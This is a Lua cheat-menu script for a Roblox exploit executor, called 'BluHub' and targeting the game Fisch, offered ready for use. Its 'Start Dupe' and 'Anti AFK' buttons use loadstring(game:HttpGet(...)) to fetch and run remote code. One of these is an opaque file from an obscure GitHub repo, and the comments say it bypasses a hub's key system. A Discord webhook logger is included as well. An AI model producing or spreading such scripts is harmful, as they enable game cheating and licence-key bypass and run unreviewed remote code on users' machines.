-- BluHub Menu Script
-- Kill script command: _G.BluHubKill = true

_G.BluHubKill = false

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Webhook logger state
local webhookEnabled = false
local webhookURL = ""
local loggedFish = {}

-- ============================================================
-- GUI SETUP
-- ============================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BluHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = (gethui and gethui()) or game.CoreGui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 420, 0, 380)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -190)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(60, 100, 255)
MainStroke.Thickness = 1.5
MainStroke.Parent = MainFrame

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleBar

-- Fix bottom corners of title bar
local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0.5, 0)
TitleFix.Position = UDim2.new(0, 0, 0.5, 0)
TitleFix.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Text = "🎣  BluHub"
TitleLabel.Size = UDim2.new(1, -90, 1, 0)
TitleLabel.Position = UDim2.new(0, 14, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 16
TitleLabel.Parent = TitleBar

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Text = "—"
MinBtn.Size = UDim2.new(0, 30, 0, 24)
MinBtn.Position = UDim2.new(1, -70, 0.5, -12)
MinBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
MinBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 14
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TitleBar

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 6)
MinCorner.Parent = MinBtn

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "✕"
CloseBtn.Size = UDim2.new(0, 30, 0, 24)
CloseBtn.Position = UDim2.new(1, -34, 0.5, -12)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 13
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseBtn

-- Content Frame
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, -20, 1, -50)
ContentFrame.Position = UDim2.new(0, 10, 0, 46)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- ============================================================
-- REOPEN BUTTON (shown when minimized)
-- ============================================================

local ReopenBtn = Instance.new("TextButton")
ReopenBtn.Text = "🎣 BluHub"
ReopenBtn.Size = UDim2.new(0, 110, 0, 34)
ReopenBtn.Position = UDim2.new(0, 10, 1, -50)
ReopenBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ReopenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ReopenBtn.Font = Enum.Font.GothamBold
ReopenBtn.TextSize = 13
ReopenBtn.BorderSizePixel = 0
ReopenBtn.Visible = false
ReopenBtn.Parent = ScreenGui

local ReopenCorner = Instance.new("UICorner")
ReopenCorner.CornerRadius = UDim.new(0, 8)
ReopenCorner.Parent = ReopenBtn

local ReopenStroke = Instance.new("UIStroke")
ReopenStroke.Color = Color3.fromRGB(60, 100, 255)
ReopenStroke.Thickness = 1.2
ReopenStroke.Parent = ReopenBtn

-- ============================================================
-- HELPER: Create Button
-- ============================================================

local function createButton(parent, yPos, text, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 42)
    btn.Position = UDim2.new(0, 0, 0, yPos)
    btn.BackgroundColor3 = color or Color3.fromRGB(30, 30, 45)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.Text = text
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = true
    btn.Parent = parent

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(60, 100, 255)
    stroke.Thickness = 1
    stroke.Parent = btn

    return btn
end

-- ============================================================
-- BUTTON 1: Start Dupe (Fisch Insta Catch w/ Key Bypass)
-- ============================================================

local SectionLabel1 = Instance.new("TextLabel")
SectionLabel1.Text = "FISCH SCRIPTS"
SectionLabel1.Size = UDim2.new(1, 0, 0, 18)
SectionLabel1.Position = UDim2.new(0, 0, 0, 0)
SectionLabel1.BackgroundTransparency = 1
SectionLabel1.TextColor3 = Color3.fromRGB(100, 130, 255)
SectionLabel1.Font = Enum.Font.GothamBold
SectionLabel1.TextSize = 11
SectionLabel1.TextXAlignment = Enum.TextXAlignment.Left
SectionLabel1.Parent = ContentFrame

local Btn1 = createButton(ContentFrame, 22, "▶  Start Dupe  (Fisch Insta Catch)", Color3.fromRGB(25, 25, 40))

Btn1.MouseButton1Click:Connect(function()
    if _G.BluHubKill then return end
    Btn1.Text = "⏳ Loading..."
    Btn1.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
    pcall(function()
        -- Runs the full Rayfield hub (key system included)
        loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
        -- After Rayfield loads, run final script directly (bypasses key prompt)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/p7reeessssssxxxx/hello/refs/heads/main/asdkjdsajk.lua"))()
    end)
    Btn1.Text = "✔  Start Dupe  (Loaded)"
    Btn1.BackgroundColor3 = Color3.fromRGB(20, 70, 30)
end)

-- ============================================================
-- BUTTON 2: Anti AFK
-- ============================================================

local Btn2 = createButton(ContentFrame, 72, "🛡  Anti AFK", Color3.fromRGB(25, 25, 40))

Btn2.MouseButton1Click:Connect(function()
    if _G.BluHubKill then return end
    Btn2.Text = "⏳ Loading..."
    Btn2.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AsylumHUB/AsylumHUB-Anti-AFK/refs/heads/main/Main"))()
    end)
    Btn2.Text = "✔  Anti AFK  (Active)"
    Btn2.BackgroundColor3 = Color3.fromRGB(20, 70, 30)
end)

-- ============================================================
-- BUTTON 3: Discord Fish Logger
-- ============================================================

local SectionLabel2 = Instance.new("TextLabel")
SectionLabel2.Text = "DISCORD FISH LOGGER"
SectionLabel2.Size = UDim2.new(1, 0, 0, 18)
SectionLabel2.Position = UDim2.new(0, 0, 0, 128)
SectionLabel2.BackgroundTransparency = 1
SectionLabel2.TextColor3 = Color3.fromRGB(100, 130, 255)
SectionLabel2.Font = Enum.Font.GothamBold
SectionLabel2.TextSize = 11
SectionLabel2.TextXAlignment = Enum.TextXAlignment.Left
SectionLabel2.Parent = ContentFrame

-- Webhook TextBox
local WebhookBox = Instance.new("TextBox")
WebhookBox.PlaceholderText = "Paste Discord Webhook URL here..."
WebhookBox.Text = ""
WebhookBox.Size = UDim2.new(1, 0, 0, 34)
WebhookBox.Position = UDim2.new(0, 0, 0, 150)
WebhookBox.BackgroundColor3 = Color3.fromRGB(22, 22, 35)
WebhookBox.TextColor3 = Color3.fromRGB(220, 220, 255)
WebhookBox.PlaceholderColor3 = Color3.fromRGB(90, 90, 120)
WebhookBox.Font = Enum.Font.Gotham
WebhookBox.TextSize = 12
WebhookBox.ClearTextOnFocus = false
WebhookBox.BorderSizePixel = 0
WebhookBox.Parent = ContentFrame

local WBCorner = Instance.new("UICorner")
WBCorner.CornerRadius = UDim.new(0, 8)
WBCorner.Parent = WebhookBox

local WBStroke = Instance.new("UIStroke")
WBStroke.Color = Color3.fromRGB(60, 100, 255)
WBStroke.Thickness = 1
WBStroke.Parent = WebhookBox

-- Toggle Row
local ToggleRow = Instance.new("Frame")
ToggleRow.Size = UDim2.new(1, 0, 0, 38)
ToggleRow.Position = UDim2.new(0, 0, 0, 192)
ToggleRow.BackgroundTransparency = 1
ToggleRow.Parent = ContentFrame

local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.Text = "Logger Status:"
ToggleLabel.Size = UDim2.new(0.55, 0, 1, 0)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
ToggleLabel.Font = Enum.Font.Gotham
ToggleLabel.TextSize = 13
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.Parent = ToggleRow

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Text = "OFF"
ToggleBtn.Size = UDim2.new(0, 80, 0, 28)
ToggleBtn.Position = UDim2.new(1, -80, 0.5, -14)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(140, 30, 30)
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 13
ToggleBtn.BorderSizePixel = 0
ToggleBtn.Parent = ToggleRow

local TCorner = Instance.new("UICorner")
TCorner.CornerRadius = UDim.new(0, 6)
TCorner.Parent = ToggleBtn

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Text = "Logger is OFF. Enter webhook and enable."
StatusLabel.Size = UDim2.new(1, 0, 0, 28)
StatusLabel.Position = UDim2.new(0, 0, 0, 238)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(130, 130, 160)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.TextWrapped = true
StatusLabel.Parent = ContentFrame

-- ============================================================
-- DIVIDER
-- ============================================================

local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, 0, 0, 1)
Divider.Position = UDim2.new(0, 0, 0, 276)
Divider.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
Divider.BorderSizePixel = 0
Divider.Parent = ContentFrame

-- Kill script label
local KillLabel = Instance.new("TextLabel")
KillLabel.Text = "⚠  To kill script run:  _G.BluHubKill = true"
KillLabel.Size = UDim2.new(1, 0, 0, 24)
KillLabel.Position = UDim2.new(0, 0, 0, 284)
KillLabel.BackgroundTransparency = 1
KillLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
KillLabel.Font = Enum.Font.Gotham
KillLabel.TextSize = 11
KillLabel.TextXAlignment = Enum.TextXAlignment.Left
KillLabel.Parent = ContentFrame

-- ============================================================
-- FISH LOGGER LOGIC
-- ============================================================

local rarityColors = {
    Common    = 0x95a5a6,
    Uncommon  = 0x2ecc71,
    Rare      = 0x3498db,
    Epic      = 0x9b59b6,
    Legendary = 0xf39c12,
    Mythic    = 0xe74c3c,
    Divine    = 0xffd700,
    Exotic    = 0xff69b4,
}

local boldRarities = {Rare=true, Epic=true, Legendary=true, Mythic=true, Divine=true, Exotic=true}

local function sendWebhook(fishName, rarity, weight, location)
    if not webhookEnabled or webhookURL == "" then return end
    local color = rarityColors[rarity] or 0xffffff
    local isBold = boldRarities[rarity]
    local nameDisplay = isBold and ("**" .. fishName .. "**") or fishName
    local rarityDisplay = isBold and ("**" .. rarity .. "**") or rarity
    local weightStr = weight and (tostring(math.floor(weight * 100) / 100) .. " lbs") or "Unknown"
    local locationStr = location or "Unknown"

    local payload = game:GetService("HttpService"):JSONEncode({
        embeds = {{
            title = "🎣 Fish Caught!",
            description = string.format(
                "**Fish:** %s\n**Rarity:** %s\n**Weight:** %s\n**Location:** %s",
                nameDisplay, rarityDisplay, weightStr, locationStr
            ),
            color = color,
            footer = { text = "BluHub Fish Logger • " .. os.date("%X") }
        }}
    })

    pcall(function()
        local http = game:GetService("HttpService")
        http:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson)
    end)
end

-- Hook into Fisch catch events
local function startLogger()
    StatusLabel.Text = "✅ Logger active — watching for fish..."
    StatusLabel.TextColor3 = Color3.fromRGB(80, 200, 120)

    -- Fisch stores caught fish data in ReplicatedStorage / remotes
    -- We hook the CatchFish RemoteEvent result
    local RS = game:GetService("ReplicatedStorage")
    task.spawn(function()
        while webhookEnabled and not _G.BluHubKill do
            pcall(function()
                -- Watch for fish result values coming through common Fisch paths
                local fischFolder = RS:FindFirstChild("Fisch") or RS:FindFirstChild("GameData")
                if fischFolder then
                    local catchEvent = fischFolder:FindFirstChild("CatchFish") or fischFolder:FindFirstChild("FishCaught")
                    if catchEvent and catchEvent.ClassName == "RemoteEvent" then
                        catchEvent.OnClientEvent:Connect(function(data)
                            if _G.BluHubKill or not webhookEnabled then return end
                            if type(data) == "table" then
                                local name     = data.Name or data.FishName or data.fish or "Unknown"
                                local rarity   = data.Rarity or data.rarity or "Common"
                                local weight   = data.Weight or data.weight or 0
                                local location = data.Location or data.location or workspace.CurrentCamera and workspace.CurrentCamera.Focus and "Lake" or "Unknown"
                                sendWebhook(name, rarity, weight, location)
                                StatusLabel.Text = "🐟 Last catch: " .. name .. " (" .. rarity .. ")"
                            end
                        end)
                        break
                    end
                end
            end)
            task.wait(2)
        end
    end)
end

-- Toggle logic
ToggleBtn.MouseButton1Click:Connect(function()
    webhookURL = WebhookBox.Text
    if webhookURL == "" or webhookURL == "Paste Discord Webhook URL here..." then
        StatusLabel.Text = "⚠ Please enter a webhook URL first!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 120, 80)
        return
    end
    webhookEnabled = not webhookEnabled
    if webhookEnabled then
        ToggleBtn.Text = "ON"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 140, 60)
        startLogger()
    else
        ToggleBtn.Text = "OFF"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(140, 30, 30)
        StatusLabel.Text = "Logger paused."
        StatusLabel.TextColor3 = Color3.fromRGB(130, 130, 160)
    end
end)

-- ============================================================
-- MINIMIZE / CLOSE / REOPEN
-- ============================================================

MinBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    ReopenBtn.Visible = true
end)

ReopenBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = true
    ReopenBtn.Visible = false
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    _G.BluHubKill = true
    webhookEnabled = false
end)

-- ============================================================
-- KILL SWITCH WATCHER
-- ============================================================

task.spawn(function()
    repeat
        task.wait(1)
        if _G.BluHubKill then
            webhookEnabled = false
            pcall(function() ScreenGui:Destroy() end)
            return
        end
    until false
end)
